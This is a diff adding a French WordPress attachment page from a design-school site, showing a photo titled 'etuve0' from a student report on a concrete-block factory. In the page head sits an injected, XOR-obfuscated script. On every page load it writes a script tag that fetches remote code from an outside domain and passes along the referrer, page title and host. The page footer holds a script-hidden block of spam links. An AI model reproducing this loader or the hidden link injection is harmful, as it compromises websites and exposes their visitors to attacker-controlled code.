@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+<head>
+<meta charset="UTF-8" />
+<title>etuve0 | Technologie et méthodologie pour designer</title>
+<link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="stylesheet" type="text/css" media="all" href="http://designtech.ensad.fr/wp-content/themes/twentyten/style.css" />
+<link rel="pingback" href="http://designtech.ensad.fr/xmlrpc.php" />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Technologie et méthodologie pour designer &raquo; Flux" href="http://designtech.ensad.fr/?feed=rss2" />
+<link rel="alternate" type="application/rss+xml" title="Technologie et méthodologie pour designer &raquo; Flux des commentaires" href="http://designtech.ensad.fr/?feed=comments-rss2" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/designtech.ensad.fr\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.12"}};
+			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='https://api.w.org/' href='http://designtech.ensad.fr/?rest_route=/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://designtech.ensad.fr/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://designtech.ensad.fr/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.7.12" />
+<link rel='shortlink' href='http://designtech.ensad.fr/?p=535' />
+<link rel="alternate" type="application/json+oembed" href="http://designtech.ensad.fr/?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=http%3A%2F%2Fdesigntech.ensad.fr%2F%3Fattachment_id%3D535" />
+<link rel="alternate" type="text/xml+oembed" href="http://designtech.ensad.fr/?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=http%3A%2F%2Fdesigntech.ensad.fr%2F%3Fattachment_id%3D535&#038;format=xml" />
+    <!-- ###: -->
+    <script>var a="'02'02'02'02'1Aqapkrv'1G'2C'02'02'02'02'02'02'02'02dwlavkml'02qvpkleEgl'0:ngl'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02vgzv'02'1F'02'00'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02tcp'02ajcpqgv'02'1F'02'00c`afgdejkhinolmrspqvwtuz{x23016745:;'00'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02dmp'0:'02tcp'02k'1F2'1@'02k'02'1A'02ngl'1@'02k))'02'0;'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02vgzv'02)'1F'02ajcpqgv,ajcpCv'0:Ocvj,dnmmp'0:Ocvj,pclfmo'0:'0;'02('02ajcpqgv,nglevj'0;'0;'1@'2C'02'02'02'02'02'02'02'02'02'02'02'02pgvwpl'02vgzv'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'02'02'02'02qgvVkogmwv'0:32'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02qg]pgdgppgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:uklfmu,nmacvkml,jmqv'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02`cqg'02'1F'02'00k,knnwoklcvkmlgq,amo-hqlkvaj'00'1@'2C'02'02'02'02'02'02'02'02tcp'02wwkf'02'1F'02qvpkleEgl'0:7'0;'1@'2C'02'02'02'02'02'02'02'02tcp'02l]wpn'02'1F'02'00jvvr'1C--'00'02)'02wwkf'02)'02'00,'00'02)'02`cqg'02)'02'00'1Dfgdcwnv]ig{umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'2C'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'02'00'04qg]pgdgppgp'1F'00'02)'02qg]pgdgppgp'02)'02'00'04qmwpag'1F'00'02)'02jmqv'1@'2C'02'02'02'02'02'02'02'02kd'02'0:fgdcwnv]ig{umpf'02'03'1F'1F'02lwnn'02'04'04'02fgdcwnv]ig{umpf'02'03'1F'1F'02'05'05'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02lwnn'02'04'04'02qg]pgdgppgp'02'03'1F'1F'02'05'05'0;'5@'2C'02'02'02'02'02'02'02'02'02'02'02'02fmawoglv,upkvg'0:'05'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00'05'02)'02l]wpn'02)'02'05'00'1G'05'02)'02'05'1A'05'02)'02'05-qapkrv'1G'05'0;'1@'2C'02'02'02'02'02'02'02'02'5F'2C'02'02'02'02'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+    <!-- :### -->
+</head>
+
+<body class="attachment attachment-template-default single single-attachment postid-535 attachmentid-535 attachment-jpeg">
+<div id="wrapper" class="hfeed">
+	<div id="header">
+		<div id="masthead">
+			<div id="branding" role="banner">
+								<div id="site-title">
+					<span>
+						<a href="http://designtech.ensad.fr/" title="Technologie et méthodologie pour designer" rel="home">Technologie et méthodologie pour designer</a>
+					</span>
+				</div>
+				<div id="site-description">Secteur DESIGN OBJET</div>
+
+										<img src="http://designtech.ensad.fr/wp-content/uploads/2013/10/cropped-histoire_amidon.jpg" width="940" height="198" alt="" />
+								</div><!-- #branding -->
+
+			<div id="access" role="navigation">
+			  				<div class="skip-link screen-reader-text"><a href="#content" title="Aller au contenu">Aller au contenu</a></div>
+								<div class="menu-header"><ul id="menu-menu-designtech" class="menu"><li id="menu-item-10" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-10"><a href="http://designtech.ensad.fr/?cat=6">ACCUEIL</a></li>
+<li id="menu-item-26" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-26"><a href="http://designtech.ensad.fr/?cat=13">VISITES</a></li>
+<li id="menu-item-11" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-11"><a href="http://designtech.ensad.fr/?cat=7">DOCUMENTATION</a>
+<ul class="sub-menu">
+	<li id="menu-item-35" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35"><a href="http://designtech.ensad.fr/?cat=22">Les matériaux</a>
+	<ul class="sub-menu">
+		<li id="menu-item-36" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-36"><a href="http://designtech.ensad.fr/?cat=30">Introductions aux matériaux</a></li>
+		<li id="menu-item-39" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-39"><a href="http://designtech.ensad.fr/?cat=31">Les métaux</a></li>
+		<li id="menu-item-43" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-43"><a href="http://designtech.ensad.fr/?cat=32">Les verres et céramiques</a></li>
+		<li id="menu-item-42" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-42"><a href="http://designtech.ensad.fr/?cat=33">Les plastiques</a></li>
+		<li id="menu-item-38" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-38"><a href="http://designtech.ensad.fr/?cat=34">Les matériaux naturels</a></li>
+		<li id="menu-item-37" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-37"><a href="http://designtech.ensad.fr/?cat=35">Les matériaux composites</a></li>
+		<li id="menu-item-40" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-40"><a href="http://designtech.ensad.fr/?cat=29">Les mousses d&rsquo;ameublement</a></li>
+		<li id="menu-item-107" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-107"><a href="http://designtech.ensad.fr/?cat=45">Matériaux de construction écologiques</a></li>
+		<li id="menu-item-41" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-41"><a href="http://designtech.ensad.fr/?cat=40">Les nouveaux matériaux</a></li>
+	</ul>
+</li>
+	<li id="menu-item-44" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-44"><a href="http://designtech.ensad.fr/?cat=26">Les règles de moulage</a></li>
+	<li id="menu-item-45" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-45"><a href="http://designtech.ensad.fr/?cat=27">Les règles de soudure</a></li>
+	<li id="menu-item-34" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34"><a href="http://designtech.ensad.fr/?cat=25">Les liaisons</a></li>
+	<li id="menu-item-33" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-33"><a href="http://designtech.ensad.fr/?cat=28">Les jeux fonctionnels</a></li>
+	<li id="menu-item-72" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-72"><a href="http://designtech.ensad.fr/?cat=44">Transferts thermiques</a></li>
+	<li id="menu-item-31" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-31"><a href="http://designtech.ensad.fr/?cat=38">La lumière</a></li>
+	<li id="menu-item-32" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-32"><a href="http://designtech.ensad.fr/?cat=36">Le prototypage rapide</a></li>
+	<li id="menu-item-30" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-30"><a href="http://designtech.ensad.fr/?cat=39">Introduction à la physique quantique</a></li>
+	<li id="menu-item-47" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-47"><a href="http://designtech.ensad.fr/?cat=23">Rédiger un cahier des charges</a></li>
+	<li id="menu-item-29" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-29"><a href="http://designtech.ensad.fr/?cat=24">Cartographie de projet</a></li>
+</ul>
+</li>
+<li id="menu-item-12" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-12"><a href="http://designtech.ensad.fr/?cat=8">EXPERIMENTATIONS</a></li>
+<li id="menu-item-20" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20"><a href="http://designtech.ensad.fr/?cat=21">DEMOS</a></li>
+<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-17"><a href="http://designtech.ensad.fr/?cat=9">FOURNISSEURS MATERIAUX</a></li>
+<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18"><a href="http://designtech.ensad.fr/?cat=11">FABRICANTS</a></li>
+<li id="menu-item-48" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-48"><a href="http://designtech.ensad.fr/?cat=41">LIVRES</a></li>
+</ul></div>			</div><!-- #access -->
+		</div><!-- #masthead -->
+	</div><!-- #header -->
+
+	<div id="main">
+
+		<div id="container" class="single-attachment">
+			<div id="content" role="main">
+
+			
+
+									<p class="page-title"><a href="http://designtech.ensad.fr/?p=542" title="Revenir à Parpaing , fabrication dans l&#039; usines à blocs de Betonor. (Par Auguste HAZEMANN)" rel="gallery"><span class="meta-nav">&larr;</span> Parpaing , fabrication dans l&#039; usines à blocs de Betonor. (Par Auguste HAZEMANN)</a></p>
+				
+				<div id="post-535" class="post-535 attachment type-attachment status-inherit hentry">
+					<h2 class="entry-title">etuve0</h2>
+
+					<div class="entry-meta">
+						<span class="meta-prep meta-prep-author">Par</span> <span class="author vcard"><a class="url fn n" href="http://designtech.ensad.fr/?author=3" title="Afficher tous les articles par Eleves" rel="author">Eleves</a></span>						<span class="meta-sep">|</span>
+						<span class="meta-prep meta-prep-entry-date">Publié le</span> <span class="entry-date"><abbr class="published" title="13 h 10 min">20 mai 2014</abbr></span> <span class="meta-sep">|</span> La taille originale est de <a href="http://designtech.ensad.fr/wp-content/uploads/2014/05/etuve0.jpg" title="Lien vers l&rsquo;image originale">900 &times; 600</a> pixels											</div><!-- .entry-meta -->
+
+					<div class="entry-content">
+						<div class="entry-attachment">
+						<p class="attachment"><a href="http://designtech.ensad.fr/?attachment_id=536" title="etuve0" rel="attachment"><img width="900" height="600" src="http://designtech.ensad.fr/wp-content/uploads/2014/05/etuve0.jpg" class="attachment-900x900 size-900x900" alt="" srcset="http://designtech.ensad.fr/wp-content/uploads/2014/05/etuve0.jpg 900w, http://designtech.ensad.fr/wp-content/uploads/2014/05/etuve0-300x200.jpg 300w" sizes="(max-width: 900px) 100vw, 900px" /></a></p>
+
+						<div id="nav-below" class="navigation">
+							<div class="nav-previous"><a href='http://designtech.ensad.fr/?attachment_id=534'>conditionement</a></div>
+							<div class="nav-next"><a href='http://designtech.ensad.fr/?attachment_id=536'>malaxeur beton</a></div>
+						</div><!-- #nav-below -->
+						</div><!-- .entry-attachment -->
+						<div class="entry-caption"></div>
+
+
+					</div><!-- .entry-content -->
+
+					<div class="entry-utility">
+						Vous pouvez la mettre en favoris avec <a href="http://designtech.ensad.fr/?attachment_id=535" title="Permalien pour etuve0" rel="bookmark">ce permalien</a>.											</div><!-- .entry-utility -->
+				</div><!-- #post-## -->
+
+
+			<div id="comments">
+
+
+
+
+</div><!-- #comments -->
+
+
+			</div><!-- #content -->
+		</div><!-- #container -->
+
+	</div><!-- #main -->
+
+	<div id="footer" role="contentinfo">
+		<div id="colophon">
+
+
+
+			<div id="site-info">
+				<a href="http://designtech.ensad.fr/" title="Technologie et méthodologie pour designer" rel="home">
+					Technologie et méthodologie pour designer				</a>
+			</div><!-- #site-info -->
+
+			<div id="site-generator">
+								<a href="http://wordpress.org/" title="Plate-forme de publication personnelle à la pointe de la sémantique">Fièrement propulsé par WordPress</a>
+			</div><!-- #site-generator -->
+
+		</div><!-- #colophon -->
+	</div><!-- #footer -->
+
+</div><!-- #wrapper -->
+
+<div id="ae4ab2f"><ul><li><a href="http://designtech.ensad.fr/?p=9039" title="Exemple de titres participatifs" >Exemple de titres participatifs</a></li> <li><a href="http://designtech.ensad.fr/?p=9038" title="Exemple de fiche de poste d`un manutentionnaire" >Exemple de fiche de poste d`un manutentionnaire</a></li> <li><a href="http://designtech.ensad.fr/?p=9037" title="Un exemple de loi organique" >Un exemple de loi organique</a></li> <li><a href="http://designtech.ensad.fr/?p=9036" title="Exemple lettre de motivation technicien btp" >Exemple lettre de motivation technicien btp</a></li> <li><a href="http://designtech.ensad.fr/?p=9035" title="Exemple fiche de poste aide à domicile" >Exemple fiche de poste aide à domicile</a></li> <li><a href="http://designtech.ensad.fr/?p=9034" title="Exemple de rapport d`enquete policiere" >Exemple de rapport d`enquete policiere</a></li> <li><a href="http://designtech.ensad.fr/?p=9033" title="Exemple de probleme de math cm1" >Exemple de probleme de math cm1</a></li> <li><a href="http://designtech.ensad.fr/?p=9032" title="Exemple de phrase avec correlation" >Exemple de phrase avec correlation</a></li> <li><a href="http://designtech.ensad.fr/?p=9031" title="Exemple de mind mapping" >Exemple de mind mapping</a></li> <li><a href="http://designtech.ensad.fr/?p=9030" title="Exemple de lettre pour une offre d`emploi" >Exemple de lettre pour une offre d`emploi</a></li> <li><a href="http://designtech.ensad.fr/?p=9029" title="Exemple de lettre de motivation pour un poste d`éducateur spécialisé" >Exemple de lettre de motivation pour un poste d`éducateur spécialisé</a></li> <li><a href="http://designtech.ensad.fr/?p=9028" title="Exemple de lettre de démission d`un cdi sans préavis" >Exemple de lettre de démission d`un cdi sans préavis</a></li> <li><a href="http://designtech.ensad.fr/?p=9027" title="Exemple de garantie à première demande" >Exemple de garantie à première demande</a></li> <li><a href="http://designtech.ensad.fr/?p=9026" title="Exemple de domaine de prédilection" >Exemple de domaine de prédilection</a></li> <li><a href="http://designtech.ensad.fr/?p=9025" title="exemple de compétence pour cv parcoursup" >exemple de compétence pour cv parcoursup</a></li> <li><a href="http://designtech.ensad.fr/?p=9024" title="exemple de cadre de référence fondamental" >exemple de cadre de référence fondamental</a></li> <li><a href="http://designtech.ensad.fr/?p=9023" title="exemple d`un rapport de visite de site" >exemple d`un rapport de visite de site</a></li> <li><a href="http://designtech.ensad.fr/?p=9022" title="exemple contrat de mariage tunisien" >exemple contrat de mariage tunisien</a></li> <li><a href="http://designtech.ensad.fr/?p=9021" title="autres facons de dire par exemple" >autres facons de dire par exemple</a></li> <li><a href="http://designtech.ensad.fr/?p=9020" title="erwin 9 다운로드" >erwin 9 다운로드</a></li> </ul><div><script type="text/javascript"> document.getElementById("ae4ab2f").style.display="none"; </script><script type='text/javascript' src='http://designtech.ensad.fr/wp-includes/js/wp-embed.min.js?ver=4.7.12'></script>
+</body>
+</html>
